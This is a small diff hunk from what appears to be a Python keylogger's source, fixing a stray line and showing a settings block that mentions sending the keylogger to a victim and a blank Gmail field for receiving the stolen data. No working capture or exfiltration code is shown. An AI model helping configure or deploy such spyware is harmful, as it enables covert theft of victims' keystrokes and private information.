@@ -9,7 +9,7 @@ t="";pics_names=[]
 
 
 #Note: You have to edit this part from sending the keylogger to the victim
-change it now
+#change it now
 #########Settings########
 
 yourgmail=""                                        #What is your gmail?
